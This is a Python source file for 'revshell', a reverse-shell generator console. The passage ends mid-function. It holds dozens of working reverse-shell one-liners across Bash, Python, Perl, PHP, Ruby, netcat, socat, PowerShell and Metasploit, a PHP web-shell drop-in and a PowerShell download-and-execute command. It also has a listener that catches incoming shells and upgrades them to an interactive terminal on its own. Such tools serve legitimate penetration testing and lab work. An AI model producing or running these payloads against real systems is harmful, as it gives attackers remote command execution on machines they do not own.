#!/usr/bin/env python3
"""
revshell — Reverse Shell Generator Console
Author  : @ZetaOrioniss
Version : v2.1
"""

import sys
import os
import shlex
import readline
import subprocess
import shutil
import socket
import struct
import json
import re
import pty
import tty
import termios
import select
import time
import threading
import argparse
from dataclasses import dataclass, field
from typing import Optional


class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    MAGENTA= "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    GREY   = "\033[90m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    ITALIC = "\033[3m"
    UNDER  = "\033[4m"
    END    = "\033[0m"

    @staticmethod
    def r(s):    return f"{C.RED}{s}{C.END}"
    @staticmethod
    def g(s):    return f"{C.GREEN}{s}{C.END}"
    @staticmethod
    def y(s):    return f"{C.YELLOW}{s}{C.END}"
    @staticmethod
    def b(s):    return f"{C.BLUE}{s}{C.END}"
    @staticmethod
    def m(s):    return f"{C.MAGENTA}{s}{C.END}"
    @staticmethod
    def c(s):    return f"{C.CYAN}{s}{C.END}"
    @staticmethod
    def w(s):    return f"{C.WHITE}{s}{C.END}"
    @staticmethod
    def grey(s): return f"{C.GREY}{s}{C.END}"
    @staticmethod
    def bold(s): return f"{C.BOLD}{s}{C.END}"
    @staticmethod
    def dim(s):  return f"{C.DIM}{s}{C.END}"
    @staticmethod
    def ul(s):   return f"{C.UNDER}{s}{C.END}"
    @staticmethod
    def it(s):   return f"{C.ITALIC}{s}{C.END}"
    @staticmethod
    def strip(s: str) -> str:
        return re.sub(r'\033\[[0-9;]*m', '', s)


# ─── Payloads ─────────────────────────────────────────────────────────────────

@dataclass
class Payload:
    key:      str
    name:     str
    platform: str
    category: str
    template: str
    note:     str = ""

    def render(self, lhost: str, lport: str) -> str:
        return self.template.format(lhost=lhost, lport=lport)


PAYLOADS: list[Payload] = [
    Payload("bash_tcp",  "Bash TCP",        "unix", "bash",
        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1", "Classic one-liner"),
    Payload("bash_196",  "Bash FD 196",     "unix", "bash",
        "0<&196;exec 196<>/dev/tcp/{lhost}/{lport};sh <&196 >&196 2>&196",
        "Uses file descriptor 196"),
    Payload("bash_udp",  "Bash UDP",        "unix", "bash",
        "bash -i >& /dev/udp/{lhost}/{lport} 0>&1", "UDP variant"),
    Payload("bash_read", "Bash read loop",  "unix", "bash",
        "exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"),
    Payload("sh_tcp",    "sh TCP",          "unix", "bash",
        "sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
    Payload("zsh_tcp",   "Zsh TCP",         "unix", "bash",
        "zsh -c 'zmodload zsh/net/tcp && ztcp {lhost} {lport} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"),

    Payload("python3_pty",    "Python3 PTY",     "unix", "python",
        "python3 -c 'import socket,os,pty;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "pty.spawn(\"/bin/bash\")'", "Spawns a PTY"),
    Payload("python3_env",    "Python3 environ", "unix", "python",
        "export RHOST=\"{lhost}\";export RPORT={lport};"
        "python3 -c 'import sys,socket,os,pty;"
        "s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"),
    Payload("python3_thread", "Python3 threaded","unix", "python",
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "p=subprocess.Popen([\"/bin/sh\"],stdin=s,stdout=s,stderr=s)'"),
    Payload("python2",        "Python2",         "unix", "python",
        "python -c 'import socket,os,pty;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "pty.spawn(\"/bin/bash\")'"),
    Payload("python_win", "Python Windows", "windows", "python",
        "python -c 'import socket,subprocess;"
        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "subprocess.call([\"cmd.exe\"],stdin=s,stdout=s,stderr=s)'"),

    Payload("perl",       "Perl",           "unix", "perl",
        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){{" 
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");}};'"),
    Payload("perl_no_sh", "Perl no /bin/sh","unix", "perl",
        "perl -MIO -e '$p=fork;exit,if($p);"
        "$c=new IO::Socket::INET(PeerAddr,\"{lhost}:{lport}\");"
        "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>'"),
    Payload("perl_win",   "Perl Windows",   "windows","perl",
        "perl -MIO::Socket -e "
        "'$c=IO::Socket::INET->new(PeerAddr=>\"{lhost}:{lport}\");"
        "open STDIN,\"<&\",$c;open STDOUT,\">&\",$c;open STDERR,\">&\",$c;"
        "exec \"cmd.exe\"'"),

    Payload("php_exec",      "PHP exec",      "unix", "php",
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    Payload("php_proc_open", "PHP proc_open", "unix", "php",
        "php -r '$d=array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\",\"w\"));"
        "$p=proc_open(\"/bin/bash\",$d,$pp);"
        "$s=fsockopen(\"{lhost}\",{lport});"
        "while(!feof($s)){{$c=fread($s,4096);fwrite($pp[0],$c);}}'"),
    Payload("php_system",    "PHP system()",  "unix", "php",
        "<?php system(\"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>",
        "Web shell drop-in"),
    Payload("php_passthru",  "PHP passthru()","unix", "php",
        "<?php passthru(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f\"); ?>"),
    Payload("php_win",       "PHP Windows",   "windows","php",
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
        "exec(\"cmd.exe /c powershell -NoP -NonI -Exec Bypass \");'"),

    Payload("ruby",       "Ruby",           "unix", "ruby",
        "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
        "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
    Payload("ruby_no_sh", "Ruby no /bin/sh","unix", "ruby",
        "ruby -rsocket -e 'exit if fork;"
        "c=TCPSocket.new(\"{lhost}\",\"{lport}\");"
        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"),
    Payload("ruby_win",   "Ruby Windows",   "windows","ruby",
        "ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",\"{lport}\");"
        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"),

    Payload("nc_e",       "Netcat -e",      "unix", "netcat",
        "nc -e /bin/sh {lhost} {lport}", "Requires -e flag"),
    Payload("nc_mkfifo",  "Netcat mkfifo",  "unix", "netcat",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
    Payload("nc_ncat",    "Ncat",           "unix", "netcat",
        "ncat {lhost} {lport} -e /bin/bash"),
    Payload("nc_udp",     "Netcat UDP",     "unix", "netcat",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u {lhost} {lport} >/tmp/f"),
    Payload("busybox_nc", "BusyBox nc",     "unix", "netcat",
        "busybox nc {lhost} {lport} -e /bin/sh", "Embedded/IoT"),

    Payload("socat",     "Socat",          "unix", "socat",
        "socat tcp-connect:{lhost}:{lport} exec:'bash -li',pty,stderr,setsid,sigint,sane",
        "Full PTY"),
    Payload("socat_tls", "Socat TLS",      "unix", "socat",
        "socat openssl-connect:{lhost}:{lport},verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane"),
    Payload("socat_udp", "Socat UDP",      "unix", "socat",
        "socat UDP:{lhost}:{lport} exec:'bash -li',pty,stderr,setsid,sigint,sane"),

    Payload("awk",          "AWK",          "unix", "other",
        "awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do {{"
        "printf \"shell>\" |& s; s |& getline c; if (c) {{"
        "while ((c |& getline) > 0) print $0 |& s; close(c); }} }}"
        "while(c != \"exit\") }}}}'"),
    Payload("telnet",       "Telnet mkfifo","unix", "other",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {lhost} {lport} >/tmp/f"),
    Payload("lua",          "Lua",          "unix", "other",
        "lua -e \"require('socket');t=require('socket').tcp();"
        "t:connect('{lhost}','{lport}');"
        "while true do local r=t:receive();local f=io.popen(r,'r');"
        "local s=f:read('*a');f:close();t:send(s) end;t:close()\""),
    Payload("golang",       "Go",           "unix", "other",
        "echo 'package main;import(\"os/exec\";\"net\");"
        "func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");"
        "cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'"
        " > /tmp/rs.go && go run /tmp/rs.go"),
    Payload("node_js",      "Node.js",      "unix", "other",
        "require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')"),
    Payload("java_runtime", "Java Runtime", "unix", "other",
        "r=Runtime.getRuntime();"
        "p=r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};"
        "cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);"
        "p.waitFor()"),

    Payload("powershell",  "PowerShell TCP",      "windows","powershell",
        "$c=New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        "$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";"
        "$by=([text.encoding]::ASCII).GetBytes($sb2);"
        "$s.Write($by,0,$by.Length);$s.Flush()}}$c.Close()"),
    Payload("ps_oneliner", "PowerShell one-liner","windows","powershell",
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        "\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$s.Write(([text.encoding]::ASCII).GetBytes((iex $d 2>&1|Out-String)+"
        "(pwd).Path+'> '),0,1);$s.Flush()}}\""),
    Payload("ps_b64",      "PowerShell Base64",   "windows","powershell",
        "powershell -EncodedCommand "
        "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBsAGgAbwBzAHQAfQAiACwAIAB7AGwAcABvAHIAdAB9ACkA"),
    Payload("ps_icm",      "PowerShell ICM",      "windows","powershell",
        "IEX(New-Object Net.WebClient).downloadString('http://{lhost}/rs.ps1')"),
    Payload("cmd_nc",      "cmd.exe + nc",        "windows","powershell",
        "nc.exe -e cmd.exe {lhost} {lport}"),

    Payload("msf_linux_x64", "MSF Linux x64",   "unix",    "meterpreter",
        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} "
        "-f elf > /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf"),
    Payload("msf_win_x64",   "MSF Windows x64", "windows", "meterpreter",
        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe"),
    Payload("msf_ps_stager", "MSF PS stager",   "windows", "meterpreter",
        "msfvenom -p cmd/windows/reverse_powershell LHOST={lhost} LPORT={lport}"),
    Payload("msf_handler",   "MSF handler",     "both",    "meterpreter",
        "msfconsole -x 'use exploit/multi/handler; "
        "set payload linux/x64/meterpreter/reverse_tcp; "
        "set LHOST {lhost}; set LPORT {lport}; run'"),
]

PAYLOAD_MAP: dict[str, Payload] = {p.key: p for p in PAYLOADS}
CATEGORIES = ["bash","python","perl","php","ruby","netcat","socat","other","powershell","meterpreter"]
CATEGORY_LABELS = {
    "bash":        "Bash / Shell",
    "python":      "Python",
    "perl":        "Perl",
    "php":         "PHP",
    "ruby":        "Ruby",
    "netcat":      "Netcat / BusyBox",
    "socat":       "Socat",
    "other":       "Other (Lua, Go, Java, Node...)",
    "powershell":  "PowerShell / Windows",
    "meterpreter": "Metasploit Stagers",
}
PLATFORM_ICON = {"unix": "🐧", "windows": "🪟", "both": "🌐"}
NC_CANDIDATES = ["nc", "ncat", "netcat"]


# ─── Auto-upgrade engine ──────────────────────────────────────────────────────
#
# Strategy: once nc accepts a connection, we own a raw socket to the remote
# shell. We probe which upgraders are available (python3, script, socat),
# send the appropriate one-liner, then switch the local terminal to raw mode
# and relay bytes — giving a fully interactive TTY without any manual step.

UPGRADE_PROBE_TIMEOUT = 4      # seconds to wait for each command response
SETTLE_DELAY          = 0.6    # seconds to let the remote shell settle after sending


def _send(sock: socket.socket, data: str) -> None:
    """Send a string to the remote shell."""
    sock.sendall((data + "\n").encode())


def _recv_until(sock: socket.socket, timeout: float = UPGRADE_PROBE_TIMEOUT) -> str:
    """Read available bytes from the socket with a timeout."""
    sock.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
    except (socket.timeout, BlockingIOError):
        pass
    finally:
        sock.settimeout(None)
    return buf.decode(errors="replace")


def _probe_tool(sock: socket.socket, cmd: str, marker: str) -> bool:
    """
    Send `cmd` to the remote shell, wait for `marker` in the output.
    Returns True if the tool appears to be available.
    """
    _send(sock, cmd)
    out = _recv_until(sock, timeout=UPGRADE_PROBE_TIMEOUT)
    return marker.lower() in out.lower()


def _get_terminal_size() -> tuple[int, int]:
    try:
        sz = os.get_terminal_size()
        return sz.lines, sz.columns
    except OSError:
        return 24, 80


def _set_raw(fd: int) -> list:
    """Switch terminal fd to raw mode, return old attrs."""
    old = termios.tcgetattr(fd)
    tty.setraw(fd)
    return old


def _restore(fd: int, attrs: list) -> None:
    termios.tcsetattr(fd, termios.TCSADRAIN, attrs)


def _relay_interactive(sock: socket.socket) -> None:
    """
    Relay bytes between the local terminal (stdin/stdout) and the socket.
    Exits cleanly when Ctrl+C is pressed or the socket closes.
    """
    rows, cols = _get_terminal_size()
    old_attrs  = None
    try:
        old_attrs = _set_raw(sys.stdin.fileno())
        while True:
            r, _, _ = select.select([sock, sys.stdin], [], [], 0.1)
            for fd in r:
                if fd is sys.stdin:
                    data = os.read(sys.stdin.fileno(), 1024)
                    if not data:
                        return
                    # Ctrl+C sends 0x03; we trap it to exit relay mode cleanly
                    if b"\x03" in data:
                        return
                    sock.sendall(data)
                else:
                    data = sock.recv(4096)
                    if not data:
                        return
                    os.write(sys.stdout.fileno(), data)
    except (OSError, KeyboardInterrupt):
        pass
    finally:
        if old_attrs is not None:
            _restore(sys.stdin.fileno(), old_attrs)
        # Ensure clean newline after raw mode
        sys.stdout.write("\r\n")
        sys.stdout.flush()


def auto_upgrade(sock: socket.socket, lhost: str, lport: str) -> None:
    """
    Called once nc has accepted a connection and `sock` is the connected socket.
    Probes available upgrade methods and applies the best one automatically.
    """
    rows, cols = _get_terminal_size()

    # Let the remote shell settle (bash prompt, etc.)
    time.sleep(SETTLE_DELAY)
    _recv_until(sock, timeout=1.5)   # drain banner / prompt

    print(f"\r\n  {C.bold('Auto-upgrading shell...')}\r")

    # ── Strategy 1: python3 pty ───────────────────────────────────────────────
    if _probe_tool(sock, "command -v python3 2>/dev/null", "/python3"):
        print(f"  {C.g('[✔]')} python3 found — spawning PTY\r")
        time.sleep(0.2)
        _send(sock, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        time.sleep(SETTLE_DELAY)
        _recv_until(sock, timeout=1.5)
        _finalize_tty(sock, rows, cols, method="python3")
        return

    # ── Strategy 2: python2 ────────────────────────────────────────────────────
    if _probe_tool(sock, "command -v python 2>/dev/null", "/python"):
        print(f"  {C.g('[✔]')} python2 found — spawning PTY\r")
        time.sleep(0.2)
        _send(sock, "python -c 'import pty; pty.spawn(\"/bin/bash\")'")
        time.sleep(SETTLE_DELAY)
        _recv_until(sock, timeout=1.5)
        _finalize_tty(sock, rows, cols, method="python2")
        return

    # ── Strategy 3: script ────────────────────────────────────────────────────
    if _probe_tool(sock, "command -v script 2>/dev/null", "/script"):
        print(f"  {C.g('[✔]')} script found — allocating PTY\r")
        time.sleep(0.2)
        _send(sock, "script /dev/null -c bash")
        time.sleep(SETTLE_DELAY)
        _recv_until(sock, timeout=1.5)
        _finalize_tty(sock, rows, cols, method="script")
        return

    # ── Strategy 4: socat ─────────────────────────────────────────────────────
    if _probe_tool(sock, "command -v socat 2>/dev/null", "/socat"):
        print(f"  {C.g('[✔]')} socat found — using fully interactive shell\r")
        # Socat needs a second listener on our side; we open one in a thread
        socat_port = int(lport) + 1
        print(f"  {C.y('[!]')} socat listener → port {socat_port}\r")
        _send(sock,
              f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
              f"tcp:{lhost}:{socat_port}")
        # Open the second listener
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", socat_port))
        srv.listen(1)
        srv.settimeout(8)
        try:
            conn, _ = srv.accept()
            srv.close()
            time.sleep(0.3)
            _relay_interactive(conn)
            conn.close()
        except socket.timeout:
            print(f"  {C.r('[✗]')} socat: no connection on port {socat_port}\r")
            srv.close()
        return

    # ── Fallback: dumb relay — no PTY available ───────────────────────────────
    print(f"  {C.y('[!]')} No python/script/socat found — dumb relay (no PTY)\r")
    print(f"  {C.grey('Ctrl+C to exit')}\r")
    _relay_interactive(sock)


def _finalize_tty(sock: socket.socket, rows: int, cols: int, method: str) -> None:
    """
    After spawning a PTY on the remote side, fix the terminal size
    and hand over to the interactive relay.
    """
    print(f"  {C.g('[✔]')} Setting terminal size {cols}x{rows}\r")
    # stty rows/cols on the remote
    _send(sock, f"stty rows {rows} cols {cols}")
    time.sleep(0.2)
    _recv_until(sock, timeout=0.5)
    # Set TERM
    _send(sock, "export TERM=xterm-256color")
    time.sleep(0.1)
    _recv_until(sock, timeout=0.5)
    print(f"  {C.g('[✔]')} Shell upgraded via {method} — enjoy!\r")
    print(f"  {C.grey('Press ENTER to continue')}\r\n")
    _relay_interactive(sock)


# ─── Smart listener ───────────────────────────────────────────────────────────

def smart_listener(port: str, lhost: str, use_rlwrap: bool = False,
                   auto_upgrade_flag: bool = True) -> None:
    """
    Open a TCP listener, wait for a connection, then auto-upgrade the shell.
    Pure Python — no nc required for the auto-upgrade path.
    """
    try:
        lport_int = int(port)
    except ValueError:
        print(C.r(f"  Invalid port: {port}"))
        return

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", lport_int))
    except OSError as e:
        print(C.r(f"  Could not bind port {port}: {e}"))
        return

    srv.listen(1)

    print(f"\n  {C.grey('─' * 62)}")
    print(f"  {C.bold('Smart Listener')}  {C.g(f'0.0.0.0:{port}')}")
    if auto_upgrade_flag:
        print(f"  {C.grey('Auto-upgrade: ON')}  "
              f"{C.grey('(python3 → python2 → script → socat → dumb)')}")
    print(f"  {C.grey('Ctrl+C to stop')}")
    print(f"  {C.grey('─' * 62)}\n")

    try:
        srv.settimeout(None)
        conn, addr = srv.accept()
        remote_ip, remote_port = addr
        srv.close()

        print(f"  {C.g('[+]')} Connection from {C.bold(C.c(remote_ip))}:{remote_port}\r\n")

        if auto_upgrade_flag:
            auto_upgrade(conn, lhost, port)
        else:
            print(f"  {C.grey('Auto-upgrade disabled — dumb relay (Ctrl+C to exit)')}\r\n")
            _relay_interactive(conn)

        conn.close()
        print(f"\n  {C.grey('Connection closed.')}\n")

    except KeyboardInterrupt:
        srv.close()
        print(f"\n\n  {C.grey('Listener stopped.')}\n")
    except OSError as e:
        print(C.r(f"  Socket error: {e}"))


# ─── Legacy nc listener (kept for rlwrap / fallback) ─────────────────────────

def find_nc() -> Optional[tuple[str, str]]:
    for binary in NC_CANDIDATES:
        path = shutil.which(binary)
        if path:
            return binary, path
    return None


def nc_listener(port: str, use_rlwrap: bool = False) -> None:
    result = find_nc()
    if result is None:
        print(f"\n  {C.r('Netcat not found.')}  sudo apt install netcat-openbsd\n")
        return
    binary, path = result
    cmd = [binary, "-lvnp", port]
    if use_rlwrap:
        if not shutil.which("rlwrap"):
            print(f"  {C.y('rlwrap not found — falling back to plain netcat.')}")
        else:
            cmd = ["rlwrap"] + cmd
    print(f"\n  {C.grey('─' * 60)}")
    print(f"  {C.bold('Listener')}   {C.g(' '.join(cmd))}")
    print(f"  {C.grey(f'Binary: {path}')}")
    print(f"  {C.grey('Waiting on port')} {C.g(port)}  {C.grey('Ctrl+C to stop')}")
    print(f"  {C.grey('─' * 60)}\n")
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n  {C.grey('Listener stopped.')}\n")
    except FileNotFoundError:
        print(C.r(f"  Could not execute '{cmd[0]}'."))


# ─── Network interface helpers ────────────────────────────────────────────────

def get_interfaces() -> dict[str, str]:
    ifaces: dict[str, str] = {}
    try:
        import fcntl
        SIOCGIFADDR = 0x8915
        for _, name in socket.if_nameindex():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packed = fcntl.ioctl(s.fileno(), SIOCGIFADDR,
                                     struct.pack("256s", name[:15].encode()))
                ip = socket.inet_ntoa(packed[20:24])
                s.close()
                if not ip.startswith("127."):
                    ifaces[name] = ip
            except Exception:
                pass
        if ifaces:
            return ifaces
    except Exception:
        pass
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show"],
                                      stderr=subprocess.DEVNULL, text=True)
        cur = None
        for line in out.splitlines():
            line = line.strip()
            if line and line[0].isdigit():
                cur = line.split(":")[1].strip().split("@")[0]
            elif line.startswith("inet ") and cur:
                ip = line.split()[1].split("/")[0]
                if not ip.startswith("127."):
                    ifaces[cur] = ip
        if ifaces:
            return ifaces
    except Exception:
        pass
    try:
        out = subprocess.check_output(["ifconfig"],
                                      stderr=subprocess.DEVNULL, text=True)
        cur = None
        for line in out.splitlines():
            if line and not line[0].isspace():
                cur = line.split(":")[0].split()[0]
            if "inet " in line and cur:
                parts = line.strip().split()
                for i, p in enumerate(parts):
                    if p in ("inet", "addr:"):
                        ip = parts[i + 1].replace("addr:", "")
                        if not ip.startswith("127."):
                            ifaces[cur] = ip
                        break
        if ifaces:
            return ifaces
    except Exception:
        pass
    return ifaces


def resolve_iface_ip(name: str) -> Optional[str]:
    return get_interfaces().get(name)


def is_interface_name(value: str) -> bool:
    return not bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", value))


def print_interfaces(highlight: Optional[str] = None) -> None:
    ifaces = get_interfaces()
    W = 54
    print(f"\n  {C.grey('─' * W)}")
    print(f"  {C.bold('  INTERFACE'):<30}{C.bold('IPv4')}")
    print(f"  {C.grey('─' * W)}")
    if not ifaces:
        print(f"  {C.r('  No interfaces found.')}")
    for name, ip in ifaces.items():
        is_hl    = bool(highlight and name == highlight)
        marker   = f"  {C.y('◀')}" if is_hl else ""
        name_s   = C.bold(C.g(name)) if is_hl else C.g(name)
        ip_s     = C.bold(C.c(ip))   if is_hl else ip
        name_pad = 28 + len(C.GREEN) + len(C.END) + (len(C.BOLD) if is_hl else 0)
        print(f"  {name_s:<{name_pad}}{ip_s}{marker}")
    print(f"  {C.grey('─' * W)}\n")


def interactive_iface_picker(session: "Session") -> None:
    ifaces = get_interfaces()
    if not ifaces:
        print(f"  {C.r('No interfaces found.')}")
        return
    entries = list(ifaces.items())
    W = 54
    print(f"\n  {C.grey('─' * W)}")
    print(f"  {C.bold('  #'):<8}{C.bold('INTERFACE'):<22}{C.bold('IPv4')}")
    print(f"  {C.grey('─' * W)}")
    for i, (name, ip) in enumerate(entries, 1):
        print(f"  {C.grey(str(i)):<{6+len(C.GREY)+len(C.END)}}"
              f"{C.g(name):<{22+len(C.GREEN)+len(C.END)}}{ip}")
    print(f"  {C.grey('─' * W)}")
    print(f"  {C.grey('Number or name (empty to cancel):')}")
    try:
        choice = input(f"  {C.bold(C.GREEN)}>{C.END} ").strip()
    except (KeyboardInterrupt, EOFError):
        print()
        return
    if not choice:
        print(C.grey("  Cancelled."))
        return
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(entries):
            name, ip = entries[idx]
        else:
            print(C.r(f"  Invalid number: {choice}"))
            return
    elif choice in ifaces:
        name, ip = choice, ifaces[choice]
    else:
        print(C.r(f"  Unknown interface: '{choice}'"))
        return
    session.lhost = ip
    change_config(host=ip)
    print(f"\n  LHOST  {C.grey('=>')}  {C.bold(C.g(ip))}  {C.grey('(' + name + ')')}\n")


# ─── Session (LHOST/LPORT config) ────────────────────────────────────────────

class Session:
    def __init__(self):
        self.lhost: Optional[str] = None
        self.lport: Optional[str] = None

    def set(self, key: str, value: str) -> tuple[bool, Optional[str]]:
        k = key.lower()
        if k in ("ip", "lhost", "host"):
            if is_interface_name(value):
                ip = resolve_iface_ip(value)
                if ip is None:
                    return False, None
                self.lhost = ip
                return True, ip
            self.lhost = value
            return True, None
        if k in ("port", "lport"):
            self.lport = value
            return True, None
        return False, None

    def render_lhost(self) -> str:
        return self.lhost if self.lhost else C.r("<LHOST>")

    def render_lport(self) -> str:
        return self.lport if self.lport else C.r("<LPORT>")


# ─── Config persistence ───────────────────────────────────────────────────────

def load_config() -> dict:
    try:
        with open("conf.json") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"param": {"host": "", "port": ""}}


def change_config(host: Optional[str] = None, port: Optional[str] = None) -> None:
    config = load_config()
    if "param" not in config:
        config["param"] = {}
    if host is not None:
        config["param"]["host"] = host
    if port is not None:
        config["param"]["port"] = port
    try:
        with open("conf.json", "w") as f:
            json.dump(config, f, indent=4)
    except IOError as e:
        print(C.r(f"  Failed to write config: {e}"))


# ─── Shell passthrough ────────────────────────────────────────────────────────

def run_shell_command(raw_cmd: str) -> None:
    print(f"\n  {C.grey('─' * 60)}")
    try:
        result = subprocess.run(raw_cmd, shell=True, text=True,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        for line in result.stdout.splitlines():
            print(f"  {line}")
        for line in result.stderr.splitlines():
            print(f"  {C.grey(line)}")
        if result.returncode != 0:
            print(f"\n  {C.grey('Exit code:')} {C.y(str(result.returncode))}")
    except Exception as e:
        print(f"  {C.r(str(e))}")
    print(f"  {C.grey('─' * 60)}\n")


# ─── Display helpers ──────────────────────────────────────────────────────────

def _render_cmd(p: Payload, session: Session) -> str:
    return p.render(session.render_lhost(), session.render_lport())


def print_all_payloads(session: Session,
                       platform_filter: Optional[str] = None,
                       cat_filter: Optional[str] = None) -> None:
    W = 110
    title = f" {session.lhost or 'LHOST'}:{session.lport or 'LPORT'} "
    print(f"\n  {C.bold(C.WHITE + title.center(W - 2) + C.END)}")
    print(f"  {C.grey('=' * W)}")
    for cat in CATEGORIES:
        if cat_filter and cat != cat_filter:
            continue
        bucket = [p for p in PAYLOADS if p.category == cat
                  and (platform_filter is None or p.platform in (platform_filter, "both"))]
        if not bucket:
            continue
        label = CATEGORY_LABELS.get(cat, cat.upper())
        print(f"\n  {C.bold(C.CYAN + '  ' + label.upper() + C.END)}")
        print(f"  {C.grey('.' * W)}")
        for p in bucket:
            icon = PLATFORM_ICON.get(p.platform, "")
            cmd  = _render_cmd(p, session)
            note = f"  {C.grey(p.note)}" if p.note else ""
            print(f"  {C.bold(p.name)}  {C.grey('[' + p.key + ']')}  {icon}{note}")
            print(f"  {C.GREEN}{cmd}{C.END}")
            print(f"  {C.grey('.' * W)}")
    print(f"  {C.grey('=' * W)}\n")


def print_single_payload(p: Payload, session: Session) -> None:
    cmd  = _render_cmd(p, session)
    icon = PLATFORM_ICON.get(p.platform, "")
    W    = 80
    print(f"\n  {C.grey('-' * W)}")
    print(f"  {C.bold(C.WHITE)}{icon} {p.name}{C.END}  "
          f"{C.grey(p.key)}  {C.grey('(' + p.platform + '/' + p.category + ')')}")
    if p.note:
        print(f"  {C.grey(p.note)}")
    print(f"  {C.grey('-' * W)}")
    print(f"\n  {C.GREEN}{cmd}{C.END}\n")
    if session.lport:
        print(f"  {C.grey('Listener:')}  nc -lvnp {session.lport}")
    print(f"\n  {C.grey('-' * W)}\n")


def print_payload_list(cat_filter: Optional[str] = None) -> None:
    W = 70
    print(f"\n  {C.grey('-' * W)}")
    print(f"  {C.bold('  KEY'):<{28+len(C.BOLD)+len(C.END)}}"
          f"{C.bold('NAME'):<22}{C.bold('OS'):<14}{C.bold('CAT')}")
    print(f"  {C.grey('-' * W)}")
    last_cat = None
    for p in PAYLOADS:
        if cat_filter and p.category != cat_filter:
            continue
